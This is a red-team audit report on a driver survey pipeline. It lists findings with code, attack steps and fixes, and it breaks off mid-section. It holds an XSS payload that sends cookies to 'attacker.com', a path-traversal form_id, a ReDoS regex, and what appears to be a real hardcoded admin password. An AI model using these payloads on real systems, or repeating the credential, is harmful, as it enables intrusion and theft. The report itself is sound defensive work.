# Comprehensive Independent Red-Team Security Assessment (Round 3 Expansion)

**Target System:** Mobile Survey Verification Pipeline (`/home/ebylxn/projects/survey-pipeline`)  
**Audit Type:** Independent Adversarial Red-Team Security & Architectural Assessment  
**Assessment Date:** 2026-11-04  
**Classification:** Confidential — Security Engineering Review  
**Auditor:** Independent Red-Team Security Auditor (`redteam-architect-auditor`)  
**Scope:** WebRTC Ingestion Gateway, Dynamic Form Engine, Administrative Management APIs, Authentication & Secret Handling, Fleet Compliance & Anti-Fraud Logic, Database Input Flows, and Concurrency Controls.

---

## 1. Executive Summary

An adversarial red-team security assessment was conducted against the latest release of the Mobile Survey Verification Pipeline. This assessment independently scrutinized the codebase across all tiers without preconceived bias toward existing documentation, prior design assertions, or test suite passing statuses.

The audit uncovered **19 distinct security vulnerabilities, architectural logic flaws, and access control breakdowns**. Most critically, the audit identified a fundamental **Architectural Disconnection ("Ghost Engine" syndrome)**: while sophisticated fleet verification, image deduplication, and financial sanitization services exist as isolated modules in `services/`, **none of them are integrated into the actual production WebRTC ingestion endpoint in `main.py`**. The production endpoint accepts unvalidated form data, permits arbitrary overwriting of driver vehicle profiles, fails open upon AI exceptions, and exposes sensitive driver PII through unauthenticated endpoints and static directories.

### Summary Vulnerability Matrix

| Vulnerability ID | Severity | Category | Title | Affected Component | Exact File & Lines |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **VULN-AUTH-04** | **HIGH** | Access Control | Unauthenticated Dev Submissions Read & Purge | Ingress Gateway | `main.py:208-225` |
| **VULN-AUTH-05** | **HIGH** | Authorization | Unauthenticated Driver Vehicle Profile Overwrite & Hijacking | Fleet Persistence | `main.py:404-415` |
| **VULN-CONF-01** | **HIGH** | Secrets Management | Hardcoded Administrative Plaintext Credentials in Source | Auth Dependency | `main.py:94-96` |
| **VULN-FS-01** | **HIGH** | Path Traversal | Arbitrary JSON File Write & Path Traversal in Schema Upload | Form Engine | `main.py:177-180` |
| **VULN-DATA-01** | **HIGH** | Data Exposure | Unauthenticated Static Exposure of Sensitive `./data` Directory | Ingress Gateway | `main.py:88` |
| **VULN-XSS-01** | **HIGH** | Code Injection | Stored Cross-Site Scripting (XSS) in Form Engine & Admin Console | Form Rendering | `dynamic_form_html.py:15,636,637,709`<br>`form_manager_html.py:28,30,37,258,427,504` |
| **VULN-ARCH-01** | **HIGH** | Architecture | Complete Disconnection of Fleet Anti-Fraud and Compliance Engines | Ingestion Pipeline | `main.py:277-440` vs `services/` |
| **VULN-AUTH-06** | **HIGH** | Authorization | Unrestricted Telegram Webhook Dossier Exfiltration | Telegram Ingress | `main.py:587-605` |
| **VULN-AI-03** | **MEDIUM** | Error Handling | Fail-Open Logic Flaw in AI Vision Fallback | Ingestion Pipeline | `main.py:360-365` |
| **VULN-DOS-01** | **MEDIUM** | Denial of Service | Regular Expression Denial of Service (ReDoS) via Dynamic Patterns | Form Engine | `services/form_engine.py:88-90` |
| **VULN-API-01** | **MEDIUM** | Input Validation | Missing Server-Side Schema Enforcement in WebRTC Ingestion | Ingestion Gateway | `main.py:277-350` |
| **VULN-CACHE-01**| **MEDIUM** | Denial of Service | Unbounded In-Memory Idempotency Cache Memory Leak (OOM DoS) | Ingress Gateway | `main.py:52, 302-303, 433` |
| **VULN-CACHE-02**| **MEDIUM** | Cache Integrity | Global Idempotency Cache Poisoning & Cross-Tenant Snooping | Ingress Gateway | `main.py:295-307, 431-438` |
| **VULN-COLL-01** | **MEDIUM** | Data Integrity | High-Probability ID Collision & Silent Drop via 24-Bit Entropy | Ingress Gateway | `main.py:293, 392` |
| **VULN-PARAM-01**| **MEDIUM** | Auth Bypass | Client-Controlled Test Mode & Image Check Bypass | Ingestion Gateway | `main.py:311-324` |
| **VULN-RACE-01** | **MEDIUM** | Concurrency | Unsynchronized File-Based Concurrency Race Condition in Dev Store| Ingress Gateway | `main.py:196-206, 220-225` |
| **VULN-PRIV-01** | **MEDIUM** | Privacy Compliance | Incomplete Decree 13 Right-to-Erasure (PII Retention in Vault & Vehicles)| Privacy Engine | `services/audit_and_privacy.py:211-242`|
| **VULN-OUTBOX-02**| **MEDIUM** | Architecture | Complete Absence of Transactional Outbox Publishing on WebRTC | Ingestion Gateway | `main.py:382-419` |
| **VULN-ENGINE-01**| **LOW** | Type Safety | Unhandled TypeError in Dynamic Schema Conditional Logic | Form Engine | `services/form_engine.py:73-74` |

---

## 2. Threat Actor Model & Attack Surfaces

The verification pipeline exposes several distinct network interfaces and trust boundaries:

```
[Public Internet]
       │
       ├───► /api/v1/survey/submit-webrtc [UNAUTHENTICATED] ──► Writes DB / Overwrites Vehicles
       ├───► /api/v1/dev/submissions      [UNAUTHENTICATED] ──► Dumps Driver PII & Financials
       ├───► /data/*                      [UNAUTHENTICATED] ──► Static access to JSON files & PII
       ├───► /forms/{form_id}             [UNAUTHENTICATED] ──► Stored XSS vectors executed
       │
[Admin Surface]
       ├───► /admin/forms                 [Basic Auth: Hardcoded "Legendofzeus2@"]
       ├───► /api/v1/forms/upload-schema  [Path Traversal & ReDoS via form_id & regex]
       │
[Third-Party Webhooks]
       ├───► /webhook/lark-survey         [Bypassed in ENVIRONMENT=development]
       └───► /webhook/telegram            [Arbitrary chat_id receives driver dossiers]
```

### Threat Actor Profiles:
1. **Unauthenticated External Attacker (WAN):** Can dump sensitive driver survey submissions, purge audit history, overwrite any legitimate driver's registered vehicle, upload malicious form schemas via hardcoded admin credentials, or mount DoS attacks against the Python event loop.
2. **Malicious / Disgruntled Driver:** Can harvest other drivers' vehicle records, submit forged surveys to alter competing drivers' vehicle types, front-run idempotency keys to poison survey verdicts, or submit synthetic AI/stock images that bypass verification.
3. **Compromised Webhook Intermediary:** Can spoof Lark or Telegram requests when deployed in default development configurations to trigger unauthorized state changes and extract internal investigative dossiers.

---

## 3. Detailed Vulnerability Analysis

---

### VULN-AUTH-04: Unauthenticated Dev Submissions Read & Purge
- **Severity:** HIGH
- **Component:** Ingress Gateway / Developer Endpoints
- **Location:** `main.py:208-225`
- **Vulnerability Mechanics:**  
  The endpoints `GET /api/v1/dev/submissions` and `DELETE /api/v1/dev/submissions` were added to inspect and purge test surveys. Unlike the administrative routes (`/admin/forms`, `/api/v1/surveys/history`), neither endpoint enforces authentication or authorization:
  ```python
  @app.get("/api/v1/dev/submissions")
  async def get_dev_submissions():
      if not os.path.exists(DEV_STORAGE_FILE):
          return {"count": 0, "submissions": []}
      with open(DEV_STORAGE_FILE, "r", encoding="utf-8") as f:
          data = json.load(f)
      return {"count": len(data), "submissions": data}

  @app.delete("/api/v1/dev/submissions")
  async def clear_dev_submissions():
      if os.path.exists(DEV_STORAGE_FILE):
          os.remove(DEV_STORAGE_FILE)
      return {"status": "cleared", "message": "Bộ nhớ tạm thử nghiệm đã được dọn sạch!"}
  ```
- **Adversarial Attack Mechanism:**  
  1. An attacker sends an unauthenticated `GET https://target/api/v1/dev/submissions`.
  2. The server responds with an unredacted JSON array containing all recorded submissions, exposing driver phone numbers, driver names, declared gross revenues, trip counts, odometer readings, license plates, and raw AI vision audit findings.
  3. The attacker subsequently issues `DELETE https://target/api/v1/dev/submissions`, immediately purging `dev_test_submissions.json` from the server, destroying audit records and operational test telemetry.
- **Business & Security Impact:**  
  Direct mass exfiltration of Personal Identifiable Information (PII) and proprietary financial data, violating Vietnamese Decree 13/2023/ND-CP on Personal Data Protection. Unauthenticated deletion permits malicious actors to sabotage dev/testing workflows and erase forensic audit trails.
- **Recommended Remediation:**  
  1. Restrict both endpoints behind administrative authentication by adding `admin_user: str = Depends(verify_admin_auth)`.
  2. In production builds, conditionally disable developer debug routes entirely:
     ```python
     if settings.ENVIRONMENT == "production":
         # Do not register dev routes
     ```

---

### VULN-AUTH-05: Unauthenticated Driver Vehicle Profile Overwrite & Hijacking
- **Severity:** HIGH
- **Component:** Fleet Persistence / Ingestion Gateway
- **Location:** `main.py:404-415`
- **Vulnerability Mechanics:**  
  When an unauthenticated submission arrives at `/api/v1/survey/submit-webrtc` with `is_test_mode=False` and a `license_plate` parameter, the backend executes an upsert against `driver_registered_vehicles`:
  ```python
  if license_plate:
      await cur.execute(
          """
          INSERT INTO driver_registered_vehicles (
              driver_phone, license_plate, vehicle_type
          ) VALUES (%s, %s, %s)
          ON CONFLICT (driver_phone) DO UPDATE 
          SET license_plate = EXCLUDED.license_plate,
              vehicle_type = EXCLUDED.vehicle_type;
          """,
          (driver_phone, license_plate.upper(), vehicle_type or "CAR"),
      )
  ```
  The endpoint performs zero verification that the submitter owns or is authorized to act on behalf of `driver_phone`.
- **Adversarial Attack Mechanism:**  
  1. Attacker discovers or enumerates a target collaborator or driver's phone number (e.g. `0988123456`).
  2. Attacker crafts a `POST /api/v1/survey/submit-webrtc` request containing:
     - `driver_phone = "0988123456"`
     - `license_plate = "30A-999.99"` (or an invalid/fake plate)
     - `vehicle_type = "BIKE"` (when the driver actually drives a `CAR`)
     - Any dummy image (or an image passing blur check).
  3. The database updates `driver_registered_vehicles` for phone `0988123456`, modifying their active vehicle to `30A-999.99` (`BIKE`).
  4. When the legitimate driver later submits their genuine survey with vehicle `29E-123.45` (`CAR`), the compliance checks or downstream admin reviews flag the survey as `VEHICLE_MISMATCH` or `VEHICLE_TYPE_UNREGISTERED`, blocking their survey approval and financial payout.
- **Business & Security Impact:**  
  Targeted profile sabotage, denial of service against legitimate fleet drivers, corruption of authoritative fleet vehicle registries, and fraudulent collaborator credential manipulation.
- **Recommended Remediation:**  
  1. Never allow the public survey ingestion endpoint to blindly overwrite permanent vehicle registration tables.
  2. Route vehicle profile creation and modifications strictly through:
     - Verified collaborator Telegram chat sessions (where `telegram_user_id` is linked to `driver_phone` in `authorized_users`).
     - Administrative moderation approval via `VehiclePersistenceTracker.approve_vehicle_change()`.

---

### VULN-CONF-01: Hardcoded Administrative Plaintext Credentials in Source
- **Severity:** HIGH
- **Component:** Authentication Dependency
- **Location:** `main.py:94-96`
- **Vulnerability Mechanics:**  
  The function `verify_admin_auth()` contains plaintext credentials committed directly into the source code:
  ```python
  def verify_admin_auth(credentials: HTTPBasicCredentials = Depends(admin_security)):
      is_user_ok = secrets.compare_digest(credentials.username, "admin")
      is_pass_ok = secrets.compare_digest(credentials.password, "Legendofzeus2@")
      if not (is_user_ok and is_pass_ok):
          raise HTTPException(...)
      return credentials.username
  ```
- **Adversarial Attack Mechanism:**  
  1. An attacker inspects the public or leaked repository, container image layer history, or client distribution bundles.
  2. The attacker extracts the credentials: Username `admin`, Password `Legendofzeus2@`.
  3. The attacker authenticates via HTTP Basic Auth to `/admin/forms`, `/admin/forms/create`, `/admin/forms/edit/{form_id}`, `/api/v1/forms/upload-schema`, and `/api/v1/surveys/history`.
- **Business & Security Impact:**  
  Complete compromise of administrative management capabilities. An attacker can reconfigure active survey schemas, view historical driver survey attempts, and inject malicious schema scripts.
- **Recommended Remediation:**  
  1. Remove hardcoded strings from `main.py`.
  2. Add `ADMIN_USERNAME: str` and `ADMIN_PASSWORD: str` to `config.py:Settings`, reading from secure environment variables.
  3. Enforce strong, randomly generated secrets in deployment environments.

---

### VULN-FS-01: Arbitrary JSON File Write & Path Traversal in Schema Upload
- **Severity:** HIGH
- **Component:** Form Engine / Persistence
- **Location:** `main.py:177-180`
- **Vulnerability Mechanics:**  
  The endpoint `POST /api/v1/forms/upload-schema` persists schemas to disk using the unvalidated, user-controlled `schema.form_id`:
  ```python
  schema_path = os.path.join(FORMS_STORAGE_DIR, f"{schema.form_id}.json")
  try:
      with open(schema_path, "w", encoding="utf-8") as f:
          f.write(schema.model_dump_json(indent=2))
  ```
  Neither `FormSchema` in `services/form_engine.py` nor `upload_form_schema()` validates that `form_id` is a safe alphanumeric slug or prevents directory traversal tokens (`../`).
- **Adversarial Attack Mechanism:**  
  1. An authenticated attacker (or an attacker using the hardcoded `Legendofzeus2@` password) uploads a schema payload with:
     ```json
     {
       "form_id": "../../../../tmp/malicious_payload",
       "title": "Exploit Schema",
       "questions": []
     }
     ```
  2. `os.path.join(FORMS_STORAGE_DIR, f"{schema.form_id}.json")` resolves to `/tmp/malicious_payload.json` (or any arbitrary writable directory such as `/etc/cron.d/`).
  3. The server writes the JSON contents to the resolved path.
- **Business & Security Impact:**  
  Arbitrary file write on the host filesystem. Depending on process permissions and directory access, attackers can overwrite configuration files, inject payloads into shared volumes, or manipulate application state outside `FORMS_STORAGE_DIR`.
- **Recommended Remediation:**  
  1. In `services/form_engine.py:FormSchema`, constrain `form_id` using a strict whitelist regex:
     ```python
     form_id: str = Field(..., pattern=r"^[a-zA-Z0-9_-]{1,64}$")
     ```
  2. In `main.py`, verify canonical path containment:
     ```python
     target_path = os.path.realpath(os.path.join(FORMS_STORAGE_DIR, f"{schema.form_id}.json"))
     base_path = os.path.realpath(FORMS_STORAGE_DIR)
     if not target_path.startswith(base_path + os.sep):
         raise HTTPException(status_code=400, detail="Mã biểu mẫu không hợp lệ")
     ```

---

### VULN-DATA-01: Unauthenticated Static Exposure of Sensitive `./data` Directory
- **Severity:** HIGH
- **Component:** Ingress Gateway
- **Location:** `main.py:88`
- **Vulnerability Mechanics:**  
  The application mounts the entire local `data` directory as a public static asset route:
  ```python
  app.mount("/data", StaticFiles(directory="data"), name="data")
  ```
  In this application, `./data` is the exact storage directory for:
  - `./data/dev_test_submissions.json` (contains all dev test survey submissions with driver phone numbers, names, financial figures, and AI analysis).
  - `./data/forms/*.json` (contains form schema configurations, administrative Telegram notification chat IDs, and recipient emails).
  - `./data/uploads/` (local fallback storage for uploaded driver images and signatures in offline/development modes).
- **Adversarial Attack Mechanism:**  
  1. An external attacker requests `GET https://target/data/dev_test_submissions.json`.
  2. The server responds with `200 OK` and dumps the entire file containing all survey attempts, PII, and financial records.
  3. The attacker requests `GET https://target/data/forms/income_survey.json` and harvests internal configuration metadata (including `notify_telegram_chat_id: -1001234567890`).
- **Business & Security Impact:**  
  Direct, unauthenticated public exposure of internal storage files, violating privacy regulations and leaking confidential corporate and driver records.
- **Recommended Remediation:**  
  1. Remove `app.mount("/data", ...)` immediately.
  2. If static assets (such as CSS or images) must be served, restrict them to a dedicated, public-safe directory (e.g. `static/`), and keep user submissions, schemas, and databases in a completely separate, unmounted storage directory.

---

### VULN-XSS-01: Stored Cross-Site Scripting (XSS) in Form Engine & Admin Console
- **Severity:** HIGH
- **Component:** Dynamic Form Renderer & Form Manager
- **Location:**  
  - `services/dynamic_form_html.py:15, 636, 637, 709`
  - `services/form_manager_html.py:28, 30, 37, 258, 427, 504`
- **Vulnerability Mechanics:**  
  Schema strings (`title`, `description`, `form_id`) are interpolated directly into HTML templates and `<script>` blocks using raw Python f-strings without HTML escaping:
  ```python
  # dynamic_form_html.py:
  <title>{schema.title}</title>
  <h1 id="headerTitle">{schema.title}</h1>
  <p id="headerDesc">{schema.description or ''}</p>
  ...
  <script>
      const SCHEMA = {schema_json};
  ```
  ```python
  # form_manager_html.py:
  forms_cards_html += f"""
      <div class="form-item-card">
          <h3>{f.title}</h3>
          <div>Mã ID: <code>{f.form_id}</code></div>
  ...
  <script>
      const INITIAL_SCHEMA = {schema_json_str};
  ```
  If `schema_json` contains a closing script tag (e.g. `</script><script>alert(document.cookie)</script>`), standard browser HTML parsers immediately terminate the `<script>` context and execute the injected markup.
- **Adversarial Attack Mechanism:**  
  1. Attacker crafts a form schema with:
     ```json
     {
       "form_id": "survey-xss",
       "title": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
       "description": "</script><img src=x onerror=alert('XSS_TRIGGERED')>",
       "questions": []
     }
     ```
  2. The schema is saved via `/api/v1/forms/upload-schema`.
  3. When an administrator navigates to `/admin/forms` or `/admin/forms/edit/survey-xss`, or when a driver visits `/forms/survey-xss`, the browser executes the malicious JavaScript payload.
- **Business & Security Impact:**  
  Complete administrative session takeover, theft of Basic Auth credentials or session cookies, injection of fake form fields to steal driver credentials, or defacement of the management console.
- **Recommended Remediation:**  
  1. Escape all dynamic text rendered in HTML tags using `html.escape()`.
  2. For embedded JSON in `<script>` tags, sanitize `<` and `>` characters:
     ```python
     safe_json = json.dumps(schema_dict).replace("<", "\\u003c").replace(">", "\\u003e")
     ```
  3. Implement a strict Content Security Policy (CSP) header blocking inline script execution without nonces.

---

### VULN-ARCH-01: Complete Architectural Disconnection of Fleet Anti-Fraud and Compliance Engines
- **Severity:** HIGH
- **Component:** Ingestion Pipeline / Architecture
- **Location:** `main.py:277-440` vs `services/`
- **Vulnerability Mechanics:**  
  The repository contains sophisticated security, anti-fraud, and compliance modules:
  - `services/vehicle_tracker.py` (`VehiclePersistenceTracker`): Tracks vehicle consistency, monitors vehicle change frequencies, detects plate mismatches, and logs vehicle history.
  - `services/online_and_ai_detector.py` (`OnlineStockAndAIDetector`): Performs dHash matching against online stock images and detects FFT synthetic AI power spectrum anomalies.
  - `services/income_sanitizer.py` (`analyze_driver_income`): Validates reported revenues against Vietnamese GSM fleet operating bounds, flags outlandish figures, and reconciles fare math.
  - `services/audit_and_privacy.py` (`tokenize_or_get_driver_id`, `record_hop_audit`): Implements Decree 13 PII pseudonymization and immutable SHA-256 hop audit chains.
  
  **Audit Finding:** In `main.py`, **NOT ONE of these modules is imported or executed in `/api/v1/survey/submit-webrtc`**:
  - `VehiclePersistenceTracker` is never imported.
  - `OnlineStockAndAIDetector` is never imported.
  - `analyze_driver_income` is never imported.
  - `tokenize_or_get_driver_id` and `record_hop_audit` are never imported.
- **Adversarial Attack Mechanism:**  
  1. An attacker submits a stock vehicle photo downloaded directly from Google Images. The endpoint only runs a simple Laplacian blur check, which the high-resolution stock image easily passes.
  2. The attacker declares an absurd monthly gross revenue of `500,000,000 VND` ($20,000 USD) for a bike driver. The endpoint stores it without validation because `analyze_driver_income()` is not wired in.
  3. The attacker submits a license plate that conflicts with the driver's registered vehicle. The endpoint does not check for mismatches; it overwrites the registered vehicle directly.
- **Business & Security Impact:**  
  The system's publicized defensive capabilities are entirely non-functional in production. Fraudulent submissions, manipulated revenues, and stock images enter the database undetected.
- **Recommended Remediation:**  
  Refactor `submit_webrtc_survey()` in `main.py` to instantiate and execute the complete verification pipeline:
  1. Check stock image hashes and FFT anomalies via `OnlineStockAndAIDetector`.
  2. Verify vehicle consistency via `VehiclePersistenceTracker.verify_and_persist_vehicle()`.
  3. Validate declared financials via `analyze_driver_income()`.
  4. Tokenize driver PII via `tokenize_or_get_driver_id()`.
  5. Record immutable audit logs via `record_hop_audit()`.

---

### VULN-AUTH-06: Unrestricted Telegram Webhook Dossier Exfiltration
- **Severity:** HIGH
- **Component:** Telegram Ingress
- **Location:** `main.py:587-605`
- **Vulnerability Mechanics:**  
  In `telegram_webhook_ingress()`, the handler processes `/query <submission_id>` commands and `admin_query:<submission_id>` callback data:
  ```python
  if text.startswith("/query ") or text.startswith("/check "):
      parts = text.split(" ", 1)
      sub_id = parts[1].strip().lstrip("#")
      dossier = await query_submission_dossier(sub_id)
      report_text = render_dossier_message(dossier)
      await send_telegram_notification(chat_id, report_text)
      return {"status": "query_command_handled"}
  ```
  The endpoint verifies the webhook secret token (or skips it if `ENVIRONMENT == "development"`), but **never verifies that the requesting Telegram `chat_id` belongs to an administrator or the authorized admin group**.
- **Adversarial Attack Mechanism:**  
  1. An adversary initiates a conversation with the Telegram bot or sends a forged webhook event containing their own personal `chat_id`.
  2. The adversary sends `/query DEV-001` or `/query VN-9921`.
  3. The backend executes `query_submission_dossier()`, formats the complete forensic report, and invokes `send_telegram_notification(chat_id, report_text)` directly to the adversary's chat.
  4. The adversary receives: driver name, phone number, registered license plate, detected plate, gross income, net income, tax ID, GPS latitude/longitude, accuracy radius, and signature image URL.
- **Business & Security Impact:**  
  Severe data breach. Any individual with Telegram access can enumerate submission IDs and exfiltrate comprehensive driver PII, location data, and financial profiles.
- **Recommended Remediation:**  
  1. Enforce strict RBAC on incoming Telegram `chat_id` and `user_id`:
     ```python
     admin_group_id = getattr(settings, "TELEGRAM_ADMIN_GROUP_ID", -1001234567890)
     if chat_id != admin_group_id:
         # Check if user has ADMIN role in authorized_users
         if not await is_user_admin(db_pool, user_id):
             return {"status": "unauthorized"}
     ```

---

### VULN-AI-03: Fail-Open Logic Flaw in AI Vision Fallback
- **Severity:** MEDIUM
- **Component:** Ingestion Pipeline
- **Location:** `main.py:360-365`
- **Vulnerability Mechanics:**  
  In `submit_webrtc_survey()`, exceptions thrown during AI vision extraction are caught to provide graceful failover:
  ```python
  except Exception as ai_err:
      logger.error(f"Vision AI call failed: {ai_err}")
      ai_res = {"status": "manual_review", "error": str(ai_err)}
      is_approved = True
      status_str = "MANUAL_REVIEW"
      reason_str = "Hệ thống đã tiếp nhận ảnh và chuyển sang chờ kiểm tra thủ công."
  ```
  Notice that `is_approved` is explicitly set to `True`.  
  Later in the persistence logic:
  ```python
  reason_str if not is_approved else None
  ```
  Because `is_approved` is `True`, `rejection_reason` is stored as `NULL`. Furthermore, lines 404-415 proceed to upsert the submitted license plate into `driver_registered_vehicles` without any AI verification having taken place!
- **Adversarial Attack Mechanism:**  
  1. An attacker crafts an image payload designed to crash the AI vision parser (e.g. an adversarial malformed image or triggering API rate limits / quota exhaustion).
  2. The AI call raises an exception.
  3. The handler sets `is_approved = True`, clears any rejection reason, and permanently writes the unvalidated vehicle registration into the database.
- **Business & Security Impact:**  
  Fail-open design flaw. Unverified, potentially fraudulent, or corrupt vehicle registrations are accepted into authoritative fleet storage whenever external AI services experience downtime or processing errors.
- **Recommended Remediation:**  
  1. Set `is_approved = False` during exception fallback.
  2. Do not upsert vehicle records into `driver_registered_vehicles` when an audit outcome is `MANUAL_REVIEW` or an error occurred.
  3. Record the explicit failure reason in the database `rejection_reason` column.

---

### VULN-DOS-01: Regular Expression Denial of Service (ReDoS) via Dynamic Schema Patterns
- **Severity:** MEDIUM
- **Component:** Form Engine
- **Location:** `services/form_engine.py:88-90`
- **Vulnerability Mechanics:**  
  The dynamic form engine allows custom schemas to supply arbitrary validation regexes:
  ```python
  if q.validation.regex_pattern:
      if not re.match(q.validation.regex_pattern, val_str):
  ```
  Python's built-in `re` module uses a backtracking NFA algorithm. When evaluating complex nested quantified regular expressions against non-matching strings, computation time grows exponentially.
- **Adversarial Attack Mechanism:**  
  1. Attacker uploads a schema containing an evil regex pattern:
     ```json
     {
       "id": "q_leak",
       "validation": {
         "regex_pattern": "^(a+)+$"
       }
     }
     ```
  2. Attacker submits a survey answer with `val_str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"`.
  3. `re.match` triggers catastrophic backtracking, taking hundreds of seconds of CPU time and blocking Python's single-threaded async event loop worker.
- **Business & Security Impact:**  
  Denial of service. All concurrent and subsequent requests to that worker are starved of CPU time, resulting in gateway 504 timeouts.
- **Recommended Remediation:**  
  1. Use Google's linear-time `re2` library (`google-re2`) for user-supplied regex evaluation.
  2. Alternatively, validate regex patterns at schema upload time using a regex complexity analyzer and enforce evaluation timeouts.

---

### VULN-API-01: Missing Server-Side Schema Enforcement in WebRTC Ingestion
- **Severity:** MEDIUM
- **Component:** Ingestion Gateway
- **Location:** `main.py:277-350`
- **Vulnerability Mechanics:**  
  While `FormSchema` defines detailed constraints (min/max numeric limits, text lengths, required question constraints), `submit_webrtc_survey()` never loads the form schema or calls `validate_submission_against_schema()`.
- **Adversarial Attack Mechanism:**  
  1. An attacker bypasses the client-side JavaScript form (`dynamic_form_html.py`) and posts directly to `/api/v1/survey/submit-webrtc`.
  2. The attacker submits negative gross revenues (`-99999999`), omits mandatory questions, or supplies strings that violate defined formats.
  3. The server processes and accepts the payload without schema-level rejection.
- **Business & Security Impact:**  
  Circumvention of business rules, ingestion of dirty/invalid telemetry, and corruption of downstream analytics.
- **Recommended Remediation:**  
  1. Accept `form_id: Optional[str] = Form("income_survey")` in `submit_webrtc_survey()`.
  2. Load the schema from `FORM_REGISTRY` and execute `validate_submission_against_schema(schema, answers)` before executing normalization or AI checks.

---

### VULN-CACHE-01: Unbounded In-Memory Idempotency Cache Memory Leak (OOM DoS)
- **Severity:** MEDIUM
- **Component:** Ingress Gateway
- **Location:** `main.py:52, 302-303, 433`
- **Vulnerability Mechanics:**  
  `LOCAL_IDEMP_CACHE: Dict[str, str] = {}` is declared globally in memory as an in-process cache fallback. Every request specifying an `idempotency_key` inserts into this dictionary:
  ```python
  if idempotency_key:
      LOCAL_IDEMP_CACHE[idempotency_key] = json.dumps(resp_data)
  ```
  The dictionary has no maximum size limit, no TTL expiration, and no LRU eviction policy.
- **Adversarial Attack Mechanism:**  
  1. An attacker sends a continuous stream of automated requests to `/api/v1/survey/submit-webrtc`, each with a unique randomized `idempotency_key` (e.g. UUIDv4).
  2. `LOCAL_IDEMP_CACHE` grows monotonically with every request.
  3. The Python heap expands until system RAM is exhausted, causing the host operating system to invoke the OOM killer and terminate the application.
- **Business & Security Impact:**  
  Process termination, service disruption, and denial of service.
- **Recommended Remediation:**  
  1. Eliminate in-memory mutable dictionaries for cross-request state.
  2. Rely exclusively on Redis with explicit TTL (`ex=86400`) and a configured eviction policy (`volatile-lru`).
  3. If an in-memory fallback is required, use a bounded LRU cache (e.g. `cachetools.LRUCache(maxsize=10000)`).

---

### VULN-CACHE-02: Global Idempotency Cache Poisoning & Cross-Tenant Snooping
- **Severity:** MEDIUM
- **Component:** Ingress Gateway
- **Location:** `main.py:295-307, 431-438`
- **Vulnerability Mechanics:**  
  Idempotency keys are cached under a flat global namespace:
  ```python
  cached_payload = await redis_client.get(f"idemp:{idempotency_key}")
  ...
  return JSONResponse(status_code=200, content=json.loads(cached_payload))
  ```
  The cache entry is not bound to a specific driver identity, tenant, or phone number.
- **Adversarial Attack Mechanism:**  
  - **Cache Poisoning (Front-running):** If an adversary anticipates an idempotency key (e.g. based on standard formatting like `SURVEY-20261104-USER123`), the adversary submits the key first with fraudulent data. When the legitimate driver submits, the server immediately returns the adversary's cached response without processing the genuine survey.
  - **Information Disclosure (Snooping):** An adversary submitting guessed idempotency keys receives cached responses containing target drivers' phone numbers, detected plates, revenue figures, and submission IDs.
- **Business & Security Impact:**  
  Unauthorized access to private survey records and sabotage of survey submissions.
- **Recommended Remediation:**  
  Scope all idempotency keys to authenticated user identities:
  ```python
  cache_key = f"idemp:{driver_phone}:{idempotency_key}"
  ```

---

### VULN-COLL-01: High-Probability ID Collision and Silent Drop via 24-Bit Entropy
- **Severity:** MEDIUM
- **Component:** Ingress Gateway
- **Location:** `main.py:293, 392`
- **Vulnerability Mechanics:**  
  Submission identifiers are generated using 3 bytes of hex entropy:
  ```python
  submission_id = f"{'DEV' if is_test_mode else 'VN'}-{secrets.token_hex(3).upper()}"
  ```
  `secrets.token_hex(3)` generates 6 hex digits, yielding $16^6 = 16,777,216$ possible values.  
  Under the Birthday Paradox, the probability of a collision reaches 50% after approximately $\sqrt{2 \times 16,777,216 \times \ln(2)} \approx 4,822$ submissions.  
  When an ID collision occurs, the database query executes:
  ```python
  INSERT INTO survey_submissions (...) VALUES (...) ON CONFLICT (submission_id) DO NOTHING;
  ```
- **Adversarial Attack Mechanism:**  
  Once the system processes a few thousand surveys, ID collisions begin occurring frequently. When a collision occurs, PostgreSQL silently discards the new record (`DO NOTHING`), but the API still returns `200 OK` with `status: APPROVED`. The driver receives a confirmation, but their survey record is never saved to the database.
- **Business & Security Impact:**  
  Silent data loss. Driver survey records vanish without errors or alerts, leading to missing payouts and lost compliance records.
- **Recommended Remediation:**  
  Use standard 128-bit UUIDs or at least 12 bytes of entropy:
  ```python
  submission_id = f"VN-{secrets.token_hex(8).upper()}"  # 64 bits of entropy (millions of years before collision)
  ```

---

### VULN-PARAM-01: Client-Controlled Test Mode & Image Check Bypass
- **Severity:** MEDIUM
- **Component:** Ingestion Gateway
- **Location:** `main.py:311-324`
- **Vulnerability Mechanics:**  
  The endpoint accepts `is_test_mode` and `bypass_img_check` as unauthenticated form parameters directly from the client request:
  ```python
  is_bypassed = bool(is_test_mode and str(bypass_img_check).lower() in ("true", "1", "t", "yes"))
  if is_bypassed:
      ai_res = {
          "status": "APPROVED",
          "gross_revenue": gross_revenue or "650000",
          "driver_phone": driver_phone,
          "detected_plate": license_plate or "29E-123.45",
          "is_screen_photo": False,
          "bypass_img_check": True,
      }
      is_approved = True
      status_str = "APPROVED"
  ```
- **Adversarial Attack Mechanism:**  
  Any client calling the public API can pass `is_test_mode=true&bypass_img_check=true`. The system completely bypasses image decoding, blur analysis, and AI vision checks, instantly returning an `APPROVED` status with synthetic facts.
- **Business & Security Impact:**  
  Enables external users to pollute dev test logs, forge verification responses, and bypass media analysis controls.
- **Recommended Remediation:**  
  1. Remove `bypass_img_check` entirely from public endpoints.
  2. Never allow untrusted clients to set `is_test_mode`; determine test mode exclusively via server configuration or authenticated dev tokens.

---

### VULN-RACE-01: Unsynchronized File-Based Concurrency Race Condition in Dev Store
- **Severity:** MEDIUM
- **Component:** Ingress Gateway / Dev Storage
- **Location:** `main.py:196-206, 220-225`
- **Vulnerability Mechanics:**  
  `append_dev_submission()` updates `dev_test_submissions.json` via an uncoordinated read-modify-write cycle:
  ```python
  def append_dev_submission(record: dict):
      records = []
      if os.path.exists(DEV_STORAGE_FILE):
          with open(DEV_STORAGE_FILE, "r", encoding="utf-8") as f:
              records = json.load(f)
      records.append(record)
      with open(DEV_STORAGE_FILE, "w", encoding="utf-8") as f:
          json.dump(records, f, ensure_ascii=False, indent=2)
  ```
  Concurrently, `clear_dev_submissions()` invokes `os.remove(DEV_STORAGE_FILE)`.
- **Adversarial Attack Mechanism:**  
  When multiple test submissions arrive simultaneously, concurrent threads/processes read the same JSON file before writes complete. Later writes overwrite earlier writes, resulting in dropped submissions and truncated/corrupted JSON files (`json.decoder.JSONDecodeError`).
- **Business & Security Impact:**  
  Data corruption, unexpected 500 Internal Server Errors, and lost test audit records.
- **Recommended Remediation:**  
